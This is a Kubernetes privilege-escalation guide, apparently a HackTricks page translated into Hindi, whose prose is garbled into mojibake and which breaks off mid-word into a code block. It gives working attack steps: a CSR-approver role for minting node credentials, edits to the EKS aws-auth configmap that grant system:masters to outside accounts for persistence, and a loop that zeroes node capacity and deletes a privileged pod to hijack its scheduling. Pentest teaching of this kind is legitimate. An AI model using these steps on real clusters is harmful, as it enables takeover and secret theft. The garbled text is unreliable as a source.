рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдПрдХ рдЯреЛрдХрди рдХреЗ рд▓рд┐рдП 275 = 14,348,907 рд╕рдВрднрд╛рд╡рдирд╛рдПрдВ рд╣реЛрддреА рд╣реИрдВред

рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЯреЛрдХрди рдЖрдИрдбреА рдХреЛ рдЕрдиреБрдорд╛рди рд▓рдЧрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рд╣рдорд▓рд╛ рдЪрд▓рд╛ рд╕рдХрддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдХреБрдЫ рдШрдВрдЯреЛрдВ рдХрд╛ рд╕рдордп рд▓рдЧреЗрдЧрд╛ред рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╕рд░реНрд╡рд┐рд╕ рдЕрдХрд╛рдЙрдВрдЯреНрд╕ рд╕реЗ рд╕реАрдХреНрд░реЗрдЯ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдореЗрдВ рд╕рдлрд▓ рд╣реЛрдиреЗ рд╕реЗ рдЙрд╕реЗ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХрд╛ рдЙрдиреНрдирдпрди рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдорд┐рд▓реЗрдЧреАред

### рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рд╕рд╛рдЗрдирд┐рдВрдЧ рдЕрдиреБрд░реЛрдз

рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рд╕рдВрд╕рд╛рдзрди `certificatesigningrequests` рдореЗрдВ **`create`** рдХреНрд░рд┐рдпрд╛ рд╣реИ (рдпрд╛ рдХрдо рд╕реЗ рдХрдо `certificatesigningrequests/nodeClient` рдореЗрдВ), рддреЛ рдЖрдк рдПрдХ рдирдП рдиреЛрдб рдХреЗ рд▓рд┐рдП рдПрдХ рдирдпрд╛ CeSR **рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ**ред

[рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реАрдХрд░рдг](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet-tls-bootstrapping/) рдХреЗ рдЕрдиреБрд╕рд╛рд░, рдЗрди рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЛ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рд╕реНрд╡реАрдХреГрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рдЖрдкрдХреЛ **рдЕрддрд┐рд░рд┐рдХреНрдд рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реЛрддреА**ред рдпрджрд┐ рдирд╣реАрдВ, рддреЛ рдЖрдкрдХреЛ рдЕрдиреБрд░реЛрдз рдХреЛ рд╕реНрд╡реАрдХреГрдд рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдП, рдЬрд┐рд╕рдХрд╛ рдорддрд▓рдм рд╣реИ `certificatesigningrequests/approval` рдореЗрдВ рдЕрджреНрдпрддрди рдФрд░ `signers` рдореЗрдВ `approve` рдХрд░рдирд╛ рд╣реЛрдЧрд╛ рдФрд░ рдЗрд╕рдореЗрдВ resourceName `<signerNameDomain>/<signerNamePath>` рдпрд╛ `<signerNameDomain>/*` рд╣реЛрдЧрд╛ред

рд╕рднреА рдЖрд╡рд╢реНрдпрдХ рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд╕рд╛рде рдПрдХ рд░реЛрд▓ рдХрд╛ **рдЙрджрд╛рд╣рд░рдг** рд╣реИ:
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: csr-approver
rules:
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests
verbs:
- get
- list
- watch
- create
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests/approval
verbs:
- update
- apiGroups:
- certificates.k8s.io
resources:
- signers
resourceNames:
- example.com/my-signer-name # example.com/* can be used to authorize for all signers in the 'example.com' domain
verbs:
- approve
```
рддреЛ, рдирдП рдиреЛрдб CSR рдХреЛ рдордВрдЬреВрд░реА рдорд┐рд▓рдиреЗ рдХреЗ рд╕рд╛рде, рдЖрдк рдиреЛрдб рдХреА рд╡рд┐рд╢реЗрд╖ рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рд░рд╣рд╕реНрдпреЛрдВ рдХреЛ рдЪреБрд░рд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдмрдврд╝рд╛ рд╕рдХрддреЗ рд╣реИрдВред

[**рдЗрд╕ рдкреЛрд╕реНрдЯ**](https://www.4armed.com/blog/hacking-kubelet-on-gke/) рдФрд░ [**рдЗрд╕ рдкреЛрд╕реНрдЯ**](https://rhinosecuritylabs.com/cloud-security/kubelet-tls-bootstrap-privilege-escalation/) рдореЗрдВ GKE K8s TLS Bootstrap рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреЛ **рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд╕рд╛рдЗрдирд┐рдВрдЧ** рдХреЗ рд╕рд╛рде рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдЗрд╕реЗ рджреБрд░реБрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддрд╛рдХрд┐ рдПрдХ рдирдП K8s рдиреЛрдб рдХреЗ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдЙрддреНрдкрдиреНрди рдХрд┐рдП рдЬрд╛ рд╕рдХреЗрдВ рдФрд░ рдлрд┐рд░ рдЙрдирдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдмрдврд╝рд╛ рд╕рдХреЗрдВ рд░рд╣рд╕реНрдпреЛрдВ рдХреЛ рдЪреБрд░рд╛ рд╕рдХреЗрдВред\
рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдЙрд▓реНрд▓рд┐рдЦрд┐рдд рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╣реИрдВ рддреЛ рдЖрдк рдПрдХ рд╣реА рдЪреАрдЬрд╝ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдкрд╣рд▓рд╛ рдЙрджрд╛рд╣рд░рдг рдПрдХ рдирдП рдиреЛрдб рдХреЛ рд╕реАрдорд┐рдд рдХрд░рдиреЗ рд╡рд╛рд▓реА рддреНрд░реБрдЯрд┐ рдХреЛ рдЕрдирджреЗрдЦрд╛ рдХрд░рддрд╛ рд╣реИ рдЬреЛ рдирдИ рдиреЛрдб рдХреЛ рдЙрд╕ рдкрд░ рдорд╛рдЙрдВрдЯ рдХрд┐рдП рдЧрдП рдХрдВрдЯреЗрдирд░реЛрдВ рдореЗрдВ рд░рд╣рд╕реНрдпреЛрдВ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рд╕реЗ рд░реЛрдХрддреА рд╣реИ рдХреНрдпреЛрдВрдХрд┐ **рдиреЛрдб рдХреЗрд╡рд▓ рдЙрд╕ рдкрд░ рдорд╛рдЙрдВрдЯ рдХрд┐рдП рдЧрдП рдХрдВрдЯреЗрдирд░реЛрдВ рдХреЗ рд░рд╣рд╕реНрдпреЛрдВ рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХрддрд╛ рд╣реИред**

рдЗрд╕реЗ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХрд╛ рддрд░реАрдХрд╛ рдмрд╕ рдпрд╣ рд╣реИ рдХрд┐ **рдЖрдк рд░реБрдЪрд┐рдХрд░ рд░рд╣рд╕реНрдпреЛрдВ рдХреЗ рд╕рд╛рде рдорд╛рдЙрдВрдЯ рдХрд┐рдП рдЧрдП рдХрдВрдЯреЗрдирд░ рдХреЗ рдиреЛрдб рдирд╛рдо рдХреЗ рд▓рд┐рдП рдиреЛрдб рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдмрдирд╛рдПрдВ** (рд▓реЗрдХрд┐рди рдкрд╣рд▓реЗ рдкреЛрд╕реНрдЯ рдореЗрдВ рдЗрд╕реЗ рдХреИрд╕реЗ рдХрд░рдирд╛ рд╣реИ рд╡рд╣ рдЬрд╛рдВрдЪреЗрдВ):
```bash
"/O=system:nodes/CN=system:node:gke-cluster19-default-pool-6c73b1-8cj1"
```
### AWS EKS aws-auth configmaps

рдЙрди рдкреНрд░рд┐рдВрд╕рд┐рдкрд▓реНрд╕ рдХреЛ рдЬреЛ EKS (AWS рдореЗрдВ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП) рдХреНрд▓рд╕реНрдЯрд░реНрд╕ рдкрд░ kube-system рдиреЗрдорд╕реНрдкреЗрд╕ рдореЗрдВ **`configmaps`** рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рд╡реЗ aws-auth configmap рдХреЛ рдЕрдзрд┐рд▓реЗрдЦрд┐рдд рдХрд░рдХреЗ рдХреНрд▓рд╕реНрдЯрд░ рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
рдЖрд╡рд╢реНрдпрдХ рдХреНрд░рд┐рдпрд╛рдПрдВ **`update`** рдФрд░ **`patch`** рд╣реИрдВ, рдпрд╛ **`create`** рдЕрдЧрд░ configmap рдирд╣реАрдВ рдмрдирд╛рдпрд╛ рдЧрдпрд╛ рдерд╛:

{% code overflow="wrap" %}
```bash
# Check if config map exists
get configmap aws-auth -n kube-system -o yaml

## Yaml example
apiVersion: v1
kind: ConfigMap
metadata:
name: aws-auth
namespace: kube-system
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters

# Create donfig map is doesn't exist
## Using kubectl and the previous yaml
kubectl apply -f /tmp/aws-auth.yaml
## Using eksctl
eksctl create iamidentitymapping --cluster Testing --region us-east-1 --arn arn:aws:iam::123456789098:role/SomeRoleTestName --group "system:masters" --no-duplicate-arns

# Modify it
kubectl edit -n kube-system configmap/aws-auth
## You can modify it to even give access to users from other accounts
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters
mapUsers: |
- userarn: arn:aws:iam::098765432123:user/SomeUserTestName
username: admin
groups:
- system:masters
```
{% endcode %}

{% hint style="warning" %}
рдЖрдк **`aws-auth`** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдЖрдк **рджреГрдврд╝рддрд╛** рдХреЗ рд▓рд┐рдП рдЕрдиреНрдп рдЦрд╛рддреЛрдВ рд╕реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдкрд╣реБрдВрдЪ рджреЗ рд╕рдХреЗрдВред

рд╣рд╛рд▓рд╛рдВрдХрд┐, `aws --profile other_account eks update-kubeconfig --name <cluster-name>` **рдПрдХ рдЕрд▓рдЧ рдЦрд╛рддреЗ рд╕реЗ рдХрд╛рдо рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИ**ред рд▓реЗрдХрд┐рди рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ `aws --profile other_account eks get-token --cluster-name arn:aws:eks:us-east-1:123456789098:cluster/Testing` рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ рдЕрдЧрд░ рдЖрдк рдХреНрд▓рд╕реНрдЯрд░ рдХреЗ рдирд╛рдо рдХреЗ рдмрдЬрд╛рдп рдХреНрд▓рд╕реНрдЯрд░ рдХреЗ ARN рдХреЛ рдбрд╛рд▓реЗрдВред\
`kubectl` рдХреЛ рдХрд╛рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдВ рдХрд┐ рдЖрдкрдиреЗ **рдкреАрдбрд╝рд┐рдд рдХрд╛ kubeconfig рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛** рд╣реИ рдФрд░ aws exec args рдореЗрдВ `--profile other_account_role` рдЬреЛрдбрд╝реЗрдВ рддрд╛рдХрд┐ kubectl рдЯреЛрдХрди рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдФрд░ AWS рд╕реЗ рд╕рдВрдкрд░реНрдХ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдиреНрдп рдЦрд╛рддреЗ рдХреЗ рдкреНрд░реЛрдлрд╝рд╛рдЗрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред
{% endhint %}

### GKE рдореЗрдВ рдЙрдиреНрдирддрддрд╛

GCP рдкреНрд░рд┐рдВрд╕рд┐рдкрд▓реНрд╕ рдХреЛ K8s рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЛ рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП **2 рддрд░реАрдХреЗ** рд╣реИрдВред рдХрд┐рд╕реА рднреА рд╕реНрдерд┐рддрд┐ рдореЗрдВ рдкреНрд░рд┐рдВрд╕рд┐рдкрд▓ рдХреЛ рдЕрдиреБрдорддрд┐ **`container.clusters.get`** рднреА рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдП рддрд╛рдХрд┐ рд╡рд╣ рдХреНрд▓рд╕реНрдЯрд░ рддрдХ рдкрд╣реБрдВрдЪ рдХреЗ рд▓рд┐рдП рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЗрдХрдЯреНрдард╛ рдХрд░ рд╕рдХреЗ, рдпрд╛ рдЖрдкрдХреЛ **рдЕрдкрдирд╛ рдЦреБрдж рдХрд╛ kubectl рдХреЙрдиреНрдлрд╝рд┐рдЧ рдлрд╝рд╛рдЗрд▓ рдмрдирд╛рдирд╛** рд╣реЛрдЧрд╛ (рдЕрдЧрд▓реЗ рд▓рд┐рдВрдХ рдХрд╛ рдкрд╛рд▓рди рдХрд░реЗрдВ)ред

{% hint style="warning" %}
K8s api endpoint рд╕реЗ рдмрд╛рддрдЪреАрдд рдХрд░рддреЗ рд╕рдордп, **GCP рдкреНрд░рдорд╛рдгрд┐рдХрд╛ рдЯреЛрдХрди рднреЗрдЬрд╛ рдЬрд╛рдПрдЧрд╛**ред рдлрд┐рд░, GCP, K8s api endpoint рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ, рдкрд╣рд▓реЗ **рдЬрд╛рдВрдЪреЗрдЧрд╛ рдХрд┐ рдкреНрд░рд┐рдВрд╕рд┐рдкрд▓** (рдИрдореЗрд▓ рджреНрд╡рд╛рд░рд╛) **рдХреНрд▓рд╕реНрдЯрд░ рдХреЗ рдЕрдВрджрд░ рдХреЛрдИ рдкрд╣реБрдВрдЪ рд░рдЦрддрд╛ рд╣реИ рдпрд╛ рдирд╣реАрдВ**, рдлрд┐рд░ рдпрд╣ рдЬрд╛рдВрдЪреЗрдЧрд╛ рдХрд┐ рдЙрд╕рдХреЗ рдкрд╛рд╕ **GCP IAM рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХреЛрдИ рдкрд╣реБрдВрдЪ рд╣реИ рдпрд╛ рдирд╣реАрдВ**ред\
рдпрджрд┐ рдЗрдирдореЗрдВ рд╕реЗ **рдХреЛрдИ рднреА рд╕рддреНрдп рд╣реИ**, рддреЛ рдЙрд╕реЗ **рдЬрд╡рд╛рдм рджрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛**ред рдпрджрд┐ рдирд╣реАрдВ, рддреЛ рдПрдХ **рддреНрд░реБрдЯрд┐** рджреА рдЬрд╛рдПрдЧреА рдЬреЛ рд╕реБрдЭрд╛рд╡ рджреЗрдЧреА рдХрд┐ **GCP IAM рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЕрдиреБрдорддрд┐рдпрд╛рдВ рджреЗрдВ**ред
{% endhint %}

рдлрд┐рд░, рдкрд╣рд▓рд╛ рддрд░реАрдХрд╛ рд╣реИ **GCP IAM рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛**, K8s рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рдкрд╛рд╕ рдЙрдирдХреА **рд╕рдордХрдХреНрд╖ GCP IAM рдЕрдиреБрдорддрд┐рдпрд╛рдБ** рд╣реЛрддреА рд╣реИрдВ, рдФрд░ рдпрджрд┐ рдкреНрд░рд┐рдВрд╕рд┐рдкрд▓ рдХреЗ рдкрд╛рд╕ рдпрд╣ рд╣реИ, рддреЛ рдЙрд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддрд╛ рд╣реИред

{% content-ref url="../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md" %}
[gcp-container-privesc.md](../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md)
{% endcontent-ref %}

рджреВрд╕рд░рд╛ рддрд░реАрдХрд╛ рд╣реИ **рдХреНрд▓рд╕реНрдЯрд░ рдХреЗ рдЕрдВрджрд░ K8s рдЕрдиреБрдорддрд┐рдпрд╛рдБ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд░рдирд╛** рдФрд░ рдкреНрд░рд┐рдВрд╕рд┐рдкрд▓ рдХреЛ рдЙрд╕рдХреЗ **рдИрдореЗрд▓** (GCP рд╕реЗрд╡рд╛ рдЦрд╛рддреЗ рд╕рдореЗрдд) рджреНрд╡рд╛рд░рд╛ рдкрд╣рдЪрд╛рдирдиреЗ рдХреЗ рд▓рд┐рдПред

### рд╕реЗрд╡рд╛ рдЦрд╛рддреЛрдВ рдЯреЛрдХрди рдмрдирд╛рдПрдБ

**TokenRequests** (`serviceaccounts/token`) рдмрдирд╛ рд╕рдХрдиреЗ рд╡рд╛рд▓реЗ рдкреНрд░рд┐рдВрд╕рд┐рдкрд▓реНрд╕ рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ-рд╕рдордХрдХреНрд╖ SAs рдХреЗ рд▓рд┐рдП рдЯреЛрдХрди рдЬрд╛рд░реА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдпрд╣рд╛рдВ рд╕реЗ рдЬрд╛рдирдХрд╛рд░реА рдорд┐рд▓реА рд╣реИ [**рдпрд╣рд╛рдВ**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/token\_request.rego))ред

### ephemeralcontainers

**`pods/ephemeralcontainers`** рдХреЛ **`update`** рдпрд╛ **`patch`** рдХрд░ рд╕рдХрдиреЗ рд╡рд╛рд▓реЗ рдкреНрд░рд┐рдВрд╕рд┐рдкрд▓реНрд╕ рджреВрд╕рд░реЗ рдкреЙрдб рдкрд░ **рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**, рдФрд░ рд╕рдВрднрд╡рддрдГ рдПрдХ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХреГрдд securityContext рдХреЗ рд╕рд╛рде рдПрдХ ephemeral container рдЬреЛрдбрд╝рдХрд░ рдЕрдкрдиреЗ рдиреЛрдб рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓ рд╕рдХрддреЗ рд╣реИрдВред

### ValidatingWebhookConfigurations рдпрд╛ MutatingWebhookConfigurations

`validatingwebhookconfigurations` рдпрд╛ `mutatingwebhookconfigurations` рдкрд░ `create`, `update` рдпрд╛ `patch` рдХреЗ рдХрд┐рд╕реА рднреА verb рд╡рд╛рд▓реЗ рдкреНрд░рд┐рдВрд╕рд┐рдкрд▓реНрд╕ рдХреЛ рд╕рдВрднрд╡рддрдГ **рдРрд╕реА webhookconfigurations рдореЗрдВ рд╕реЗ рдПрдХ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ** рдЬрд┐рд╕рд╕реЗ рд╡реЗ **рдЙрдиреНрдирддрддрд╛ рдХреЛ рдмрдврд╝рд╛ рд╕рдХрддреЗ рд╣реИрдВ**ред

рдПрдХ [`mutatingwebhookconfigurations` рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рдЗрд╕ рдкреЛрд╕реНрдЯ рдХреЗ рдЗрд╕ рд╕реЗрдХреНрд╢рди рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ](./#malicious-admission-controller)ред

### рдЙрдиреНрдирддрддрд╛

рдЬреИрд╕рд╛ рдХрд┐ рдЖрдк рдЕрдЧрд▓реЗ рд╕реЗрдХреНрд╢рди рдореЗрдВ рдкрдврд╝ рд╕рдХрддреЗ рд╣реИрдВ: [**рдЕрдВрддрд░реНрдирд┐рд╣рд┐рдд рдЙрдиреНрдирддрддрд╛ рд░реЛрдХрдерд╛рдо**](./#built-in-privileged-escalation-prevention), рдПрдХ рдкреНрд░рд┐рдВрд╕рд┐рдкрд▓ рдХреЛ рдирдИ рдЕрдиреБрдорддрд┐рдпреЛрдВ рд╡рд╛рд▓реЗ рдирдП рд░реЛрд▓ рдпрд╛ рдХреНрд▓рд╕реНрдЯрд░рд░реЛрд▓ рдЕрдкрдбреЗрдЯ/рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдиреНрдирддрддрд╛ рдирд╣реАрдВ рдорд┐рд▓рддреА рд╣реИ рдЬрдм рддрдХ рдЙрд╕рдХреЗ рдкрд╛рд╕ рдЙрди рдирдИ рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреА рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рд╣реЛрддреА рд╣реИред рдХреЗрд╡рд▓ рдпрджрд┐ рдЙрд╕рдХреЗ рдкрд╛рд╕ **`escalate`** verb рд╣реЛрддрд╛ рд╣реИ **`roles`** рдпрд╛ **`clusterroles`** рдкрд░ред\
рддрдм рд╡рд╣ рдирдП рд░реЛрд▓, рдХреНрд▓рд╕реНрдЯрд░рд░реЛрд▓ рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИ рдЬрд┐рдирдореЗрдВ рдЙрд╕рдХреЗ рдкрд╛рд╕ рд╕реЗ рдЕрдзрд┐рдХ рдЕрдиреБрдорддрд┐рдпрд╛рдБ рд╣реЛрддреА рд╣реИрдВред

### рдиреЛрдб рдкреНрд░реЙрдХреНрд╕реА

**`nodes/proxy`** subresource рддрдХ рдкрд╣реБрдВрдЪ рд░рдЦрдиреЗ рд╡рд╛рд▓реЗ рдкреНрд░рд┐рдВрд╕рд┐рдкрд▓реНрд╕ Kubelet API рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкреЙрдб рдкрд░ рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдЗрд╕рдХреЗ рдЕрдиреБрд╕рд╛рд░ [**рдпрд╣рд╛рдВ**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/nodes\_proxy.rego))ред рдЗрд╕ рдкреЗрдЬ рдореЗрдВ Kubelet рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА:

{% content-ref url="../../kubernetes-pentesting/pentesting-kubernetes-services/kubelet-authentication-and-authorization.md" %}
[kubelet-authentication-and-authorization.md](../../kubernetes-pentesting/pentesting-kubernetes-services/kubelet-authentication-and-authorization.md)
{% endcontent-ref %}

рдпрд╣рд╛рдВ рдПрдХ рдЙрджрд╛рд╣рд░рдг рд╣реИ рдХрд┐ [**рдХреИрд╕реЗ рдПрдХ Kubelet API рдХреЗ рд▓рд┐рдП рдЕрдзрд┐рдХреГрдд рдмрд╛рддрдЪреАрдд рдХрд░рдХреЗ RCE рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ**](../pentesting-kubernetes-services.md#kubelet-rce)ред

### рдкреЙрдб рд╣рдЯрд╛рдПрдВ + рдЕрдиреБрд╕реВрдЪреАрдд рдиреЛрдб

рдкреНрд░рд┐рдВрд╕рд┐рдкрд▓реНрд╕ рдЬреЛ рдкреЙрдб рдХреЛ **рд╣рдЯ
```bash
patch_node_capacity(){
curl -s -X PATCH 127.0.0.1:8001/api/v1/nodes/$1/status -H "Content-Type: json-patch+json" -d '[{"op": "replace", "path":"/status/allocatable/pods", "value": "0"}]'
}

while true; do patch_node_capacity <id_other_node>; done &
#Launch previous line with all the nodes you need to attack

kubectl delete pods -n kube-system <privileged_pod_name>
```
{% endcode %}

### рд╕реЗрд╡рд╛рдУрдВ рдХреА рд╕реНрдерд┐рддрд┐ (CVE-2020-8554)

**`рд╕реЗрд╡рд╛рдУрдВ/рд╕реНрдерд┐рддрд┐`** рдХреЛ **рд╕рдВрд╢реЛрдзрд┐рдд** рдХрд░ рд╕рдХрдиреЗ рд╡рд╛рд▓реЗ рдкреНрд░рдореБрдЦ рд╡реНрдпрдХреНрддрд┐ рдЕрдирд┐рд░реНрдзрд╛рд░рд┐рдд CVE-2020-8554 рдХрд╛ рд╢реЛрдз рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **MiTM рд╣рдорд▓реЛрдВ** рдХреЛ рдХреНрд▓рд╕реНрдЯрд░ рдХреЗ рдЦрд┐рд▓рд╛рдл рд╢реБрд░реВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред CVE-2020-8554 рдХреЗ рд▓рд┐рдП рдЕрдзрд┐рдХрд╛рдВрд╢ рд╕реБрд░рдХреНрд╖рд╛ рдЙрдкрд╛рдп рдХреЗрд╡рд▓ рдмрд╛рд╣рд░реА IP рд╕реЗрд╡рд╛рдУрдВ рдХреЛ рд░реЛрдХрддреЗ рд╣реИрдВ (рдЗрд╕рдХреЗ рдЕрдиреБрд╕рд╛рд░ [**рдпрд╣**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/modify\_service\_status\_cve\_2020\_8554.rego))ред

### рдиреЛрдб рдФрд░ рдкреЙрдб рдХреА рд╕реНрдерд┐рддрд┐

**`рдиреЛрдб/рд╕реНрдерд┐рддрд┐`** рдпрд╛ **`рдкреЙрдб/рд╕реНрдерд┐рддрд┐`** рдкрд░ **`рдЕрджреНрдпрддрди`** рдпрд╛ **`рдкреИрдЪ`** рдЕрдиреБрдорддрд┐рдпреЛрдВ рд╡рд╛рд▓реЗ рдкреНрд░рдореБрдЦ рд╡реНрдпрдХреНрддрд┐, рд▓реЗрдмрд▓реЛрдВ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдХреЗ рдирд┐рдпреЛрдЬрди рд╕рдВрдмрдВрдзрд┐рдд рдкреНрд░рддрд┐рдмрдВрдзреЛрдВ рдХреЛ рдкреНрд░рднрд╛рд╡рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

## рдЕрдВрддрд░реНрдирд┐рд╣рд┐рдд рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡реГрджреНрдзрд┐ рдирд┐рд╡рд╛рд░рдг

рд╣рд╛рд▓рд╛рдВрдХрд┐ рдЬреЛрдЦрд┐рдордкреВрд░реНрдг рдЕрдиреБрдорддрд┐рдпрд╛рдБ рд╣реЛ рд╕рдХрддреА рд╣реИрдВ, рдХреБрдмрд░рдиреЗрдЯреАрдЬрд╝ рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЛ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡реГрджреНрдзрд┐ рдХреЗ рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рдХрд╛рд░реЛрдВ рд╕реЗ рд░реЛрдХрдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдЪреНрдЫрд╛ рдХрд╛рдо рдХрд░ рд░рд╣рд╛ рд╣реИред

рдХреБрдмрд░рдиреЗрдЯреАрдЬрд╝ рдореЗрдВ рдПрдХ [рдЕрдВрддрд░реНрдирд┐рд╣рд┐рдд рддрдВрддреНрд░](https://kubernetes.io/docs/reference/access-authn-authz/rbac/#privilege-escalation-prevention-and-bootstrapping) рд╣реИ рдЬреЛ рдЗрд╕рдХреЗ рд▓рд┐рдП рд╣реИ:

